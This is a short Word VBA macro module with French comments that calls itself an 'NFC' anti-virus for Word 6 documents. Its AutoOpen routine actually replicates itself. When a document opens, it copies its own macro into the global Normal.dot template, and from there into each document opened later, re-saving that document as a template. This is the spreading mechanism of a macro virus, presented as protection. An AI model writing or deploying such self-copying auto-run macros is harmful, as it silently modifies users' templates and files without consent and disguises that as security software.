   Attribute VB_Name = "autoOpen"

   ' NFC version 1
   ' Anti-virus pour documents Word 6.
   ' Cet Anti-virus modifie le Normal.dot pour y inserer un AutoOpen vide.

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "NFC Anti Virus"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.autoOpen.MAIN"
   Dim fichier$
   Dim model$
   Dim Macro$

   On Error GoTo -1: On Error GoTo Erreur

       WordBasic.FileSummaryInfo Update:=1
       Dim res As Object: Set res = WordBasic.DialogRecord.FileSummaryInfo(False)
       WordBasic.CurValues.FileSummaryInfo res

       fichier$ = res.Directory + "\" + res.FileName + ":autoOpen"
       model$ = "Global:autoOpen"
       Macro$ = WordBasic.[MacroFileName$](WordBasic.[MacroName$](0))

       If UCase(WordBasic.[Right$](Macro$, 10)) = "NORMAL.DOT" Then
           WordBasic.MacroCopy model$, fichier$
           WordBasic.FileSaveAs Format:=1
       Else
           WordBasic.MacroCopy fichier$, model$
       End If


   Erreur:

       On Error GoTo -1: On Error GoTo 0

   End Sub
